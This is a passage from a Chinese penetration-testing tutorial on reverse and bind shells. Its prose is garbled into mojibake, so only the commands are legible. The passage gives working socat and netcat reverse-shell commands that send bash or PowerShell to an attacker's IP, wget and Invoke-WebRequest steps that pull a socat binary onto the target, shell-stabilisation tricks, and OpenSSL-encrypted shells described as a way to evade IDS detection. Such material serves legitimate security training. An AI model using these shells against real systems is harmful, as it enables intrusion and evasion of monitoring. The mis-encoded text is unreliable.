æˆ‘ä»¬æ‰€éœ€è¦åšçš„å°±æ˜¯ä½¿ç”¨æ”»å‡»æœºä¸»åŠ¨è¿æ¥åˆ°å®ƒã€‚ è¿™å¥è¯çš„è¯­æ³•ç›¸å¯¹ç®€å•: nc &lt;target-ip&gt; &lt;chosen-port&gt; #æ”»å‡»æœºå‘å‡ºè¿æ¥åˆ°ç›®æ ‡æœº åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨ netcat æŒ‡å®šæˆ‘ä»¬é€‰æ‹©çš„ç›®æ ‡æœºç«¯å£ï¼ˆç›®æ ‡æœºä¸Šçš„ç›‘å¬å™¨æ­£åœ¨ç›‘å¬çš„ç«¯å£ï¼‰ï¼Œä»¥æ­¤å»ºç«‹åˆ°ç›®æ ‡æœºçš„å‘å¤–è¿æ¥ã€‚ï¼ˆåœ¨æœ¬æ–‡åé¢çš„å†…å®¹ä¸­ï¼Œå°†ä¼šè®²è§£å¦‚ä½•ä½¿ç”¨netcat åœ¨ç›®æ ‡æœºä¸Šè®¾ç½®ç›‘å¬å™¨ï¼‰ 0x05 shellçš„ç¨³å®šåŒ– æˆ‘ä»¬å·²ç»æ•è·æˆ–è¿æ¥åˆ°ä¸€ä¸ª Netcat shellï¼Œæ¥ä¸‹æ¥è¯¥åšä»€ä¹ˆï¼Ÿï¼ˆå¯¹shellè¿›è¡Œç¨³å®šåŒ–å¤„ç†ï¼‰ é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™äº›shelléå¸¸ä¸ç¨³å®šï¼ŒæŒ‰ä¸‹ Ctrl + C å°±ä¼šæ€æ­»æ•´ä¸ªNetcatç¨‹åºï¼Œè€Œä¸”å®ƒä»¬æ˜¯éäº¤äº’çš„ï¼Œç»å¸¸ä¼šæœ‰å¥‡æ€ªçš„æ ¼å¼é”™è¯¯ã€‚è¿™æ˜¯å› ä¸º netcatâ€œshellâ€å®é™…ä¸Šæ˜¯åœ¨ç»ˆç«¯å†…è¿è¡Œçš„è¿›ç¨‹ï¼Œè€Œä¸æ˜¯çœŸæ­£çš„ç»ˆç«¯æœ¬èº«ã€‚ å¹¸è¿çš„æ˜¯ï¼Œåœ¨ Linux ç³»ç»Ÿä¸Šæœ‰è®¸å¤šç¨³å®š netcat shell çš„æ–¹æ³•ï¼Œæˆ‘ä»¬ä¼šåœ¨è¿™é‡Œæåˆ°ä¸‰ä¸ªã€‚Windowsåå‘shellçš„ç¨³å®šåŒ–å¾€å¾€è¦å›°éš¾å¾—å¤šï¼Œç„¶è€Œï¼Œæˆ‘ä»¬å°†è¦åœ¨è¿™é‡Œä»‹ç»çš„ç¬¬äºŒä¸ªæŠ€å·§å¯¹å®ƒä¹Ÿç‰¹åˆ«æœ‰ç”¨ã€‚ æŠ€å·§1: Python æˆ‘ä»¬å°†è®¨è®ºçš„ç¬¬ä¸€ç§æŠ€å·§åªé€‚ç”¨äº Linux æœºå™¨ï¼Œå› ä¸ºåœ¨é»˜è®¤æƒ…å†µä¸‹Linuxæœºå™¨å‡ ä¹æ€»æ˜¯ä¼šå®‰è£… Pythonã€‚ è¿™æ˜¯ä¸€ä¸ªåˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µçš„è¿‡ç¨‹ï¼ˆshellç¨³å®šåŒ–çš„å‰ææ˜¯å·²ç»è·å¾—æˆ–è€…è¿æ¥åˆ°shellï¼‰: é¦–å…ˆè¦åšçš„æ˜¯ä½¿ç”¨å‘½ä»¤ï¼špython -c 'import pty;pty.spawn(\"/bin/bash\")' å®ƒå°†ä½¿ç”¨ Python äº§ç”Ÿä¸€ä¸ªåŠŸèƒ½æ›´å¥½çš„ bash shell ã€‚ è¯·æ³¨æ„ï¼Œæœ‰äº›ç›®æ ‡å¯èƒ½éœ€è¦æŒ‡å®šPython ç‰ˆæœ¬ï¼Œå¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼šæ ¹æ®éœ€è¦å°† python æ›¿æ¢ä¸º python2 æˆ– python3 ã€‚ è¿™æ—¶æˆ‘ä»¬çš„ shell ä¼šçœ‹èµ·æ¥æ›´å¥½ä¸€äº›ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶ä¸èƒ½ä½¿ç”¨tabé”®è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½æˆ–è€…æ–¹å‘é”®åŠŸèƒ½,æŒ‰ä¸‹Ctrl + C ä»ç„¶ä¼šæ€æ­»è¿™ä¸ªshell ã€‚ ç¬¬äºŒæ­¥æ˜¯ï¼šæ‰§è¡Œexport TERM=xterm ï¼Œè¿™å°†ä½¿æˆ‘ä»¬èƒ½å¤Ÿè®¿é—®ä¸€äº›æœ¯è¯­å‘½ä»¤ï¼Œä¾‹å¦‚clearå‘½ä»¤ã€‚ æœ€å(ä¹Ÿæ˜¯æœ€é‡è¦çš„) ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ Ctrl + ZæŒ‰é”®å¯¹ shell è¿›è¡Œåå°åŒ–å¤„ç†ï¼Œå¯¹shellåå°åŒ–ä¹‹åå†å‰å°åŒ–ï¼šç”¨ stty raw -echo; fg å›åˆ°æˆ‘ä»¬è‡ªå·±çš„ç»ˆç«¯å‰å°ã€‚ æ‰§è¡Œä¸Šé¢çš„å‰å°åŒ–å‘½ä»¤ï¼Œå°†ä¼šåšä¸¤ä»¶äº‹: é¦–å…ˆï¼Œè¿™ä¸ªå‰å°åŒ–å‘½ä»¤ä¼šå…³é—­æˆ‘ä»¬è‡ªå·±æœ¬èº«çš„ç»ˆç«¯è¾“å‡º (å®ƒå…è®¸æˆ‘ä»¬è®¿é—®tabé”®è‡ªåŠ¨è¡¥å…¨ã€æ–¹å‘é”®å’ŒæŒ‰ä¸‹ Ctrl + C ç»ˆæ­¢è¿›ç¨‹)ï¼Œç„¶åå†å°†ä¹‹å‰å»ºç«‹çš„åå‘shell å‰å°åŒ–ï¼Œä»è€Œå®Œæˆç¨³å®šåŒ–è¿‡ç¨‹ã€‚ å®Œæ•´çš„è¿‡ç¨‹å¦‚ä¸‹ï¼ˆå®è´¨ä¸Šæ˜¯ç”¨åå‘shellå–ä»£äº†æˆ‘ä»¬è‡ªå·±åŸæ¥ä½¿ç”¨çš„ç»ˆç«¯ï¼‰ï¼š æ³¨æ„ï¼šå¦‚æœ shell å¤±æ•ˆï¼Œä½ çš„ç»ˆç«¯ä¸­çš„ä»»ä½•è¾“å…¥éƒ½å°†ä¸å¯è§(è¿™æ˜¯ç”±äºåŸç»ˆç«¯å›æ˜¾è¢«ç¦ç”¨)ã€‚è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¯·è¾“å…¥resetå‘½ä»¤ï¼Œç„¶åæŒ‰ä¸‹å›è½¦é”®ã€‚ æŠ€å·§2: rlwrap rlwrapæ˜¯ä¸€ä¸ªç¨‹åºï¼Œç®€å•åœ°è¯´ï¼Œå®ƒå¯ä»¥è®©æˆ‘ä»¬åœ¨æ•è·åˆ°shellæ—¶ç«‹å³è®¿é—®å†å²è®°å½•ã€ tabè‡ªåŠ¨è¡¥å…¨é”®å’Œæ–¹å‘é”®ï¼›ç„¶è€Œï¼Œå¦‚æœä½ æƒ³åœ¨è¿™ä¸ªshell ä¸­ä½¿ç”¨ Ctrl + Cï¼Œè¿˜æ˜¯å¿…é¡»ä½¿ç”¨ä¸€äº›å…¶ä»–æŠ€å·§è¿›ä¸€æ­¥ç¨³å®šåŒ–shellã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œkaliæ²¡æœ‰å®‰è£…rlwrapï¼Œæ‰€ä»¥å¦‚æœè¦åœ¨kaliä¸­ä½¿ç”¨rlwrapï¼Œè¯·å…ˆå®‰è£…ä¸€ä¸‹ï¼š sudo apt install rlwrap è¦ä½¿ç”¨ rlwrpï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨ä¸€ä¸ªç¨å¾®ä¸åŒçš„ç›‘å¬å™¨: rlwrap nc -lvnp &lt;port&gt; åœ¨netcatç›‘å¬å™¨å‰é¢åŠ ä¸Š\" rlwrap \"å¯ä»¥æä¾›ä¸€ä¸ªåŠŸèƒ½æ›´å…¨é¢çš„ shellã€‚è¿™ä¸ªæŠ€å·§åœ¨å¤„ç† Windowsçš„shellæ—¶ç‰¹åˆ«æœ‰ç”¨ï¼Œå› ä¸ºä¼—æ‰€å‘¨çŸ¥ï¼ŒWindowsçš„shellå¾ˆéš¾ç¨³å®šã€‚ åœ¨å¤„ç† Linux ç›®æ ‡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸å‰é¢ç¬¬ä¸€ä¸ªæŠ€å·§ä¸­çš„ç¬¬ä¸‰ä¸ªæ­¥éª¤ç›¸åŒçš„æ–¹æ³•æ¥å®Œå…¨ç¨³å®šåŒ–shellï¼šå…ˆç”¨ Ctrl + Z åå°åŒ– shellï¼Œç„¶åå†ä½¿ç”¨stty raw-echo; fg å‘½ä»¤æ¥ç¨³å®šåŒ–å¹¶é‡æ–°è¿›å…¥ shellã€‚ æŠ€å·§3: Socat ç¨³å®šshellçš„ç¬¬ä¸‰ä¸ªç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨ä¸€ä¸ªåˆå§‹çš„ netcat shellä½œä¸ºè¿›å…¥åŠŸèƒ½æ›´å…¨é¢çš„ socat shellçš„å«è„šçŸ³ã€‚è¯·è®°ä½ï¼Œè¿™ç§æŠ€å·§æœ€å¥½æ˜¯é’ˆå¯¹ Linux ç›®æ ‡ï¼Œå› ä¸º Windows ä¸Šçš„ Socat shell ä¸ä¼šæ¯” netcat shell æ›´ç¨³å®šã€‚ ä¸ºäº†å®ç°è¿™ç§ç¨³å®šæ–¹æ³•ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å°†ä¸€ä¸ª socat é™æ€ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶(ç¼–è¯‘ä¸ºæ²¡æœ‰ä¾èµ–å…³ç³»çš„ç¨‹åºçš„ä¸€ä¸ªç‰ˆæœ¬)ä¼ è¾“åˆ°ç›®æ ‡æœºå™¨ä¸Šã€‚ä¸€ä¸ªå…¸å‹çš„å®ç°æ–¹æ³•æ˜¯ï¼šè®©æ”»å‡»æœºåœ¨åŒ…å« socat äºŒè¿›åˆ¶æ–‡ä»¶çš„ç›®å½•ä¸­å¼€å¯ä¸€ä¸ªç®€æ˜“çš„webserver(sudo python3 -m http.server 80)ã€‚ç„¶ååœ¨ç›®æ ‡æœºå™¨ä¸Šä½¿ç”¨netcat shellç•Œé¢ä¸‹è½½æ–‡ä»¶ï¼Œåœ¨ Linux ä¸Šï¼Œè¿™å¯ä»¥é€šè¿‡ curl æˆ– wget (wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat)æ¥å®Œæˆã€‚ ä¸ºäº†å®Œæ•´æ€§èµ·è§ï¼Œåœ¨è¿™é‡Œé™„ä¸Šç›®æ ‡æœºæ˜¯Windowsæ“ä½œç³»ç»Ÿçš„æƒ…å†µ: åœ¨ä¸€ä¸ª Windows CLIï¼ˆå‘½ä»¤è¡Œï¼‰ç¯å¢ƒä¸­ï¼ŒåŒæ ·çš„äº‹æƒ…ï¼ˆä¸‹è½½socatæ–‡ä»¶ï¼‰ä¹Ÿå¯ä»¥åœ¨ Powershell ä¸­å®Œæˆï¼Œä½¿ç”¨ Invoke-WebRequest æˆ–è€… webrequest ç³»ç»Ÿç±»ï¼Œ è¿™å–å†³äºå®‰è£…çš„ Powershell ç‰ˆæœ¬(Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\\\Windows\\temp\\socat.exe)ã€‚ åœ¨æ¥ä¸‹æ¥çš„å°èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»ä½¿ç”¨Socatå‘é€å’Œæ¥æ”¶shellçš„è¯­æ³•ã€‚ socatäºŒè¿›åˆ¶æ–‡ä»¶ä¸‹è½½åœ°å€ï¼ˆç‚¹å‡»å°†è‡ªåŠ¨ä¸‹è½½ï¼‰ï¼š https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat socatå®˜ç½‘ï¼š http://www.dest-unreach.org/ ä½¿ç”¨ä»¥ä¸Šä»»ä½•ä¸€ç§æŠ€æœ¯ï¼Œéƒ½å¯ä»¥æ›´æ”¹ç»ˆç«¯ tty å¤§å°ï¼Œè¿™æ˜¯ä½ çš„ç»ˆç«¯åœ¨ä½¿ç”¨å¸¸è§„ shell æ—¶ä¼šè‡ªåŠ¨å®Œæˆçš„äº‹æƒ…; ä½†æ˜¯ï¼Œå¦‚æœä½ æƒ³æ‰“å¼€ç±»ä¼¼æ–‡æœ¬ç¼–è¾‘å™¨çš„ä¸œè¥¿æ¥è¦†ç›–å±å¹•ä¸Šçš„æ‰€æœ‰å†…å®¹ï¼ˆå³ï¼šåœ¨ç»ˆç«¯ä¸­æ‰“å¼€æ–‡æœ¬ç¼–è¾‘å™¨ï¼‰ï¼Œé‚£ä¹ˆå¿…é¡»åœ¨åå‘æˆ–ç»‘å®š shell ä¸­æ‰‹åŠ¨å®Œæˆç»ˆç«¯ç•Œé¢å®½é«˜å°ºå¯¸çš„æ›´æ”¹ã€‚ é¦–å…ˆï¼Œæ‰“å¼€å¦ä¸€ä¸ªç»ˆç«¯å¹¶è¿è¡Œ stty-a ï¼Œè¿™å°†ä¸ºä½ æä¾›å¤§é‡çš„è¾“å‡ºæµï¼Œè®°ä¸‹å¼€å¤´éƒ¨åˆ†\" è¡Œ â€œå’Œâ€ åˆ— \"çš„å€¼: æ¥ä¸‹æ¥ï¼Œåœ¨åå‘/ç»‘å®š shell ä¸­è¾“å…¥ä»¥ä¸‹ä¸¤ä¸ªå‘½ä»¤: stty rows &lt;number&gt; #and stty cols &lt;number&gt; å¡«å†™ä½ åˆšæ‰åœ¨è‡ªå·±çš„ç»ˆç«¯ä¸Šè¿è¡Œ stty-a å‘½ä»¤æ‰€å¾—åˆ°çš„è¡Œå’Œåˆ—çš„å€¼ã€‚ è¿™å°†æ”¹å˜åå‘/ç»‘å®šshellç•Œé¢çš„å®½åº¦å’Œé«˜åº¦ï¼Œä»è€Œä½¿ä¸€äº›ç¨‹åºï¼Œå¦‚æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œèƒ½å¤Ÿä¾èµ–äºè¿™äº›å®½é«˜ä¿¡æ¯çš„å‡†ç¡®æ€§æ¥æ­£ç¡®åœ°æ‰“å¼€ã€‚ 0x06 Socat Socat åœ¨æŸäº›æ–¹é¢ä¸ netcat ç›¸ä¼¼ï¼Œä½†åœ¨å…¶ä»–è®¸å¤šæ–¹é¢æœ‰æ ¹æœ¬ä¸åŒã€‚ç†è§£socat çš„æœ€ç®€å•æ–¹æ³•æ˜¯æŠŠå®ƒå½“åšä¸€ä¸ªä¸¤ç‚¹ä¹‹é—´çš„è¿æ¥å™¨ã€‚è¿™ä¸¤ä¸ªç‚¹å®é™…ä¸Šå¯ä»¥æ˜¯ä¸€ä¸ªç›‘å¬ç«¯å£å’Œé”®ç›˜ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªç›‘å¬ç«¯å£å’Œä¸€ä¸ªæ–‡ä»¶ï¼Œæˆ–è€…å¯ä»¥æ˜¯ä¸¤ä¸ªç›‘å¬ç«¯å£ï¼Œè€Œsocat æ‰€åšçš„åªæ˜¯æä¾›ä¸¤ç‚¹ä¹‹é—´çš„é“¾æ¥ã€‚ è®©æˆ‘ä»¬å†æ¬¡ä»åå‘ shell å¼€å§‹ã€‚ Reverse Shellsï¼ˆåå‘shellï¼‰ å¦‚å‰æ‰€è¿°ï¼Œsocat çš„è¯­æ³•æ¯” netcat çš„è¯­æ³•éš¾å¾—å¤šï¼Œä¸‹é¢æ˜¯åœ¨socat ä¸­è®¾ç½®åå‘ shell ç›‘å¬å™¨çš„åŸºæœ¬è¯­æ³•: socat TCP-L:&lt;port&gt; - åœ¨socatä¸­ï¼Œè¿™éœ€è¦è·å–ä¸¤ä¸ªç‚¹(ä¸€ä¸ªç›‘å¬ç«¯å£å’Œä¸€ä¸ªæ ‡å‡†è¾“å…¥)å¹¶å°†å®ƒä»¬è¿æ¥åœ¨ä¸€èµ·ï¼Œå¦‚æ­¤å»ºç«‹çš„ shell æ˜¯ä¸ç¨³å®šçš„ï¼Œä½†å®ƒå¯ä»¥åœ¨ Linux æˆ– Windows ä¸Šå·¥ä½œï¼Œç›¸å½“äºNetcatä¸­çš„ nc -lvnp &lt;port&gt;. åœ¨Windowsæ“ä½œç³»ç»Ÿçš„ç›®æ ‡æœºä¸Šï¼Œæˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªå‘½ä»¤æ¥è¿æ¥æ”»å‡»æœº: socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes â€œpipesâ€é€‰é¡¹ç”¨äºå¼ºåˆ¶ powershell (æˆ– cmd.exe)ä½¿ç”¨ Unix é£æ ¼çš„æ ‡å‡†è¾“å…¥å’Œè¾“å‡ºå½¢å¼ã€‚ åœ¨Linuxç³»ç»Ÿçš„ç›®æ ‡æœºä¸Šï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥è¿æ¥æ”»å‡»æœºï¼š socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:\"bash -li\" Bind Shellsï¼ˆç»‘å®šshellï¼‰ åœ¨ Linux ç›®æ ‡ä¸Šï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è®¾ç½®ç›‘å¬å™¨: socat TCP-L:&lt;PORT&gt; EXEC:\"bash -li\" åœ¨ Windows ç›®æ ‡ä¸Šï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è®¾ç½®ç›‘å¬å™¨: socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes æˆ‘ä»¬ä½¿ç”¨\" pipes \"å‚æ•°æ¥è¿æ¥ Unix å’Œ Windows åœ¨ CLI ï¼ˆå‘½ä»¤è¡Œï¼‰ç¯å¢ƒä¸­å¤„ç†è¾“å…¥å’Œè¾“å‡ºçš„æ–¹å¼ã€‚ ä¸ç®¡ç›®æ ‡æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬åœ¨æ”»å‡»æœºå™¨ä¸Šä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥è¿æ¥åˆ° æ­£åœ¨ç›®æ ‡æœºä¸Šç­‰å¾…çš„ç›‘å¬å™¨ï¼š socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; - ç°åœ¨è®©æˆ‘ä»¬çœ‹çœ‹ Socat æ›´å¼ºå¤§çš„ç”¨é€”ä¹‹ä¸€ï¼šå»ºç«‹å®Œå…¨ç¨³å®šçš„ Linux tty åå‘ shellã€‚è¿™ä»…åœ¨ç›®æ ‡æ˜¯ Linux æ—¶æœ‰æ•ˆï¼Œä¼šå»ºç«‹ä¸€ä¸ªæ›´ç¨³å®šçš„åå‘shellã€‚ å¦‚å‰æ‰€è¿°ï¼Œsocat æ˜¯ä¸€ä¸ªéå¸¸é€šç”¨çš„å·¥å…·ï¼Œä»¥ä¸‹æŠ€å·§å¯èƒ½æ˜¯å…¶æœ€æœ‰ç”¨çš„åº”ç”¨ä¹‹ä¸€ï¼Œè¿™æ˜¯æ–°çš„ç›‘å¬å™¨è®¾ç½®è¯­æ³•ï¼š socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0 è®©æˆ‘ä»¬åˆ†ææ­¤å‘½ä»¤ï¼Œåƒå¾€å¸¸ä¸€æ ·ï¼Œæˆ‘ä»¬å°†ä¸¤ä¸ªç‚¹è¿æ¥åœ¨ä¸€èµ·ï¼Œä½†æ˜¯åœ¨è¿™é‡Œçš„ç‚¹æ˜¯ç›‘å¬ç«¯å£å’Œæ–‡ä»¶ã€‚ å…·ä½“åœ°è¯´ï¼Œæˆ‘ä»¬å°†å½“å‰çš„ TTY ï¼ˆTTYå«ä¹‰ä¸ºï¼šç»ˆç«¯ï¼‰ä½œä¸ºæ–‡ä»¶ä¼ é€’å¹¶å°†å®ƒçš„å›æ˜¾è®¾ç½®ä¸ºé›¶ã€‚è¿™å¤§çº¦ç›¸å½“äºä½¿ç”¨ Ctrl + Zä»¥åŠnetcat shell çš„stty raw -echo; fgæŠ€å·§ï¼Œè¿™æ ·å¤„ç†çš„é¢å¤–å¥½å¤„æ˜¯èƒ½å¤Ÿç«‹å³å»ºç«‹ä¸€ä¸ªç¨³å®šçš„shellå¹¶èƒ½è¿æ¥åˆ°å®Œæ•´çš„ ttyï¼ˆç»ˆç«¯ï¼‰ã€‚ æ™®é€šçš„socatç›‘å¬å™¨å¯ä»¥è¿æ¥åˆ°ä»»ä½•æœ‰æ•ˆè´Ÿè½½ï¼›ç„¶è€Œï¼Œä¸Šé¢è¿™ä¸ªç‰¹æ®Šçš„ç›‘å¬å™¨å¿…é¡»ç”¨ä¸€ä¸ªéå¸¸å…·ä½“çš„ socat å‘½ä»¤æ¥æ¿€æ´»ï¼Œè¿™æ„å‘³ç€ç›®æ ‡æœºå¿…é¡»å®‰è£… socatã€‚ å¤§å¤šæ•°æœºå™¨é»˜è®¤æƒ…å†µä¸‹æ²¡æœ‰å®‰è£…socatï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªé¢„ç¼–è¯‘çš„socatäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åç»§ç»­æ­£å¸¸æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ã€‚ é¢„ç¼–è¯‘çš„socatäºŒè¿›åˆ¶æ–‡ä»¶ï¼šhttps://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true ç‰¹æ®Šå‘½ä»¤å¦‚ä¸‹ï¼š socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane è¿™æ˜¯ä¸€ä¸ªå¾ˆå¤æ‚çš„å‘½ä»¤ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬åˆ†è§£ä¸€ä¸‹ã€‚ ç¬¬ä¸€éƒ¨åˆ†å¾ˆç®€å•â€”â€”æˆ‘ä»¬æ­£åœ¨ ä¸åœ¨æˆ‘ä»¬è‡ªå·±çš„æ”»å‡»æœºä¸Šè¿è¡Œçš„ç›‘å¬å™¨è¿›è¡Œè¿æ¥ï¼Œç¬¬äºŒéƒ¨åˆ†ä½¿ç”¨ EXEC:â€œbash -liâ€ åˆ›å»ºä¸€ä¸ªäº¤äº’å¼ bash ä¼šè¯ï¼Œæˆ‘ä»¬è¿˜ä¼ é€’äº†å‚æ•°ï¼šptyã€stderrã€sigintã€setsid å’Œ sane ptyï¼šåœ¨ç›®æ ‡ä¸Šåˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯â€”â€”è¿™æ˜¯ç¨³å®šåŒ–è¿‡ç¨‹çš„ä¸€éƒ¨åˆ† stderrï¼šç¡®ä¿åœ¨ shell ä¸­èƒ½å¤Ÿæ˜¾ç¤ºé”™è¯¯æ¶ˆæ¯ï¼ˆé€šå¸¸æ˜¯éäº¤äº’å¼ shell çš„é—®é¢˜ï¼‰ sigintï¼šå°†ä»»ä½• Ctrl + C å‘½ä»¤ä¼ é€’åˆ°å­è¿›ç¨‹ä¸­ï¼Œå…è®¸æˆ‘ä»¬åœ¨ shell ä¸­ä½¿ç”¨ Ctrl+C ç»ˆæ­¢å‘½ä»¤ setsidï¼šåœ¨æ–°ä¼šè¯ä¸­åˆ›å»ºè¿›ç¨‹ saneï¼šç¨³å®šç»ˆç«¯ï¼Œè¯•å›¾å°†ç»ˆç«¯â€œæ­£å¸¸åŒ–â€ã€‚ è¿™çœ‹èµ·æ¥æœ‰å¾ˆå¤šä¸œè¥¿éœ€è¦è€ƒè™‘ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬çœ‹çœ‹å®ƒçš„å®é™…æ•ˆæœã€‚ åœ¨å·¦è¾¹æˆ‘ä»¬æœ‰ä¸€ä¸ªç›‘å¬å™¨è¿è¡Œåœ¨æˆ‘ä»¬çš„æœ¬åœ°æ”»å‡»æœºä¸Šï¼Œåœ¨å³è¾¹æˆ‘ä»¬æœ‰ä¸€ä¸ªå·²ç»å»ºç«‹å¥½çš„åå‘shellï¼Œæ­£åœ¨ä½¿ç”¨éäº¤äº’å¼ shell è¿è¡Œã€‚æˆ‘ä»¬ä½¿ç”¨éäº¤äº’å¼çš„netcat shellï¼Œæ‰§è¡Œç‰¹æ®Šçš„ socat å‘½ä»¤ï¼Œå¹¶åœ¨å·¦ä¾§çš„ socat ç›‘å¬å™¨ä¸­æ¥æ”¶ä¸€ä¸ªå®Œå…¨äº¤äº’å¼çš„ bash shell: è¯·æ³¨æ„ï¼Œsocat shell æ˜¯å®Œå…¨äº¤äº’å¼çš„ï¼Œå…è®¸æˆ‘ä»¬ä½¿ç”¨äº¤äº’å¼å‘½ä»¤ï¼Œä¾‹å¦‚ SSHã€‚ ç„¶åæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ è®¾ç½®ä¸Šä¸€ä¸ªå°èŠ‚ä¸­æ‰€æåˆ°çš„ stty å€¼æ¥è¿›ä¸€æ­¥æ”¹è¿›shellï¼Œè¿™å°†è®©æˆ‘ä»¬èƒ½å¤Ÿæ›´å¥½åœ°ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå¦‚ Vim æˆ– Nanoã€‚ å¦‚æœsocat shell çªç„¶æ— æ³•æ­£å¸¸å·¥ä½œï¼Œåˆ™å¯ä»¥é€šè¿‡åœ¨å‘½ä»¤ä¸­æ·»åŠ  -d -d æ¥å¢åŠ ä¿¡æ¯è¾“å‡ºçš„è¯¦ç»†ç¨‹åº¦ï¼Œè¿™åœ¨å®éªŒç¯å¢ƒä¸‹éå¸¸æœ‰ç”¨ï¼Œä½†åœ¨ä¸€èˆ¬ç”¨é€”ä¸­é€šå¸¸ä¸æ˜¯å¿…éœ€çš„ã€‚ 0x07 SocatåŠ å¯†shell Socat çš„è®¸å¤šä¼˜ç‚¹ä¹‹ä¸€å°±æ˜¯å®ƒèƒ½å¤Ÿåˆ›å»ºåŠ å¯†çš„ shell â€”â€”ç»‘å®šshellå’Œåå‘shellã€‚é™¤éä½ æœ‰è§£å¯†å¯†é’¥ï¼Œå¦åˆ™æ— æ³•ç›‘è§†åŠ å¯†çš„ shellï¼Œè¿™æ ·é€šå¸¸èƒ½å¤Ÿç»•è¿‡ IDSæ£€æµ‹ã€‚ æˆ‘ä»¬åœ¨å‰é¢è®¨è®ºäº†å¦‚ä½•åˆ›å»ºåŸºæœ¬çš„ shellï¼Œå› æ­¤åœ¨è¿™é‡Œä¸å†è®¨è®ºä¸€äº›åŸºæœ¬è¯­æ³•ã€‚ å¯ä»¥è¯´ï¼Œåªè¦æŠŠ TCP ç”¨ä½œå‘½ä»¤çš„ä¸€éƒ¨åˆ†ï¼Œå°±åº”è¯¥åœ¨ä½¿ç”¨åŠ å¯†shell æ—¶å°†å…¶æ›¿æ¢ä¸º OPENSSLã€‚ æˆ‘ä»¬å°†åœ¨æœ¬å°èŠ‚ç»“æŸæ—¶ä»‹ç»ä¸€äº›ç¤ºä¾‹ï¼Œä½†é¦–å…ˆè®©æˆ‘ä»¬è°ˆè°ˆè¯ä¹¦ã€‚ åŠ å¯†åå‘shell ä¸ºäº†å»ºç«‹åŠ å¯†çš„shellï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦ç”Ÿæˆä¸€ä¸ªè¯ä¹¦ï¼Œè¿™åœ¨æˆ‘ä»¬çš„æ”»å‡»æœºä¸Šå¾ˆå®¹æ˜“åšåˆ°: openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt è¯¥å‘½ä»¤ä¼šåˆ›å»ºä¸€ä¸ª2048ä½çš„ RSA å¯†é’¥ï¼Œä»¥åŠä¸€ä¸ªåŒ¹é…çš„ cert æ–‡ä»¶ï¼Œæœ‰è‡ªç­¾åä¸”æœ‰æ•ˆæœŸä¸åˆ°ä¸€å¹´ã€‚å½“ä½ è¿è¡Œæ­¤å‘½ä»¤æ—¶ï¼Œå®ƒå°†è¦æ±‚ä½ å¡«å†™æœ‰å…³è¯ä¹¦çš„ä¿¡æ¯ï¼Œä½ å¯ä»¥ç•™ç©ºï¼Œä¹Ÿå¯ä»¥éšæœºå¡«å†™ã€‚ ç„¶åï¼Œæˆ‘ä»¬éœ€è¦å°†åˆšæ‰ä¸¤ä¸ªåˆ›å»ºçš„æ–‡ä»¶åˆå¹¶åˆ°ä¸€ä¸ª.pem æ–‡ä»¶ä¸­: cat shell.key shell.crt &gt; shell.pem ç°åœ¨ï¼Œå½“æˆ‘ä»¬è®¾ç½®åå‘ shell ç›‘å¬å™¨æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤: socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 - è¿™å°†ä½¿ç”¨æˆ‘ä»¬ç”Ÿæˆçš„è¯ä¹¦è®¾ç½®ä¸€ä¸ª OPENSSL ç›‘å¬å™¨ï¼Œå‚æ•° verify=0 å‘Šè¯‰è¿æ¥ä¸è¦è´¹å¿ƒå°è¯•éªŒè¯æˆ‘ä»¬çš„è¯ä¹¦æ˜¯å¦å·²ç”±å…¬è®¤çš„æƒå¨æœºæ„æ­£ç¡®ç­¾åã€‚ 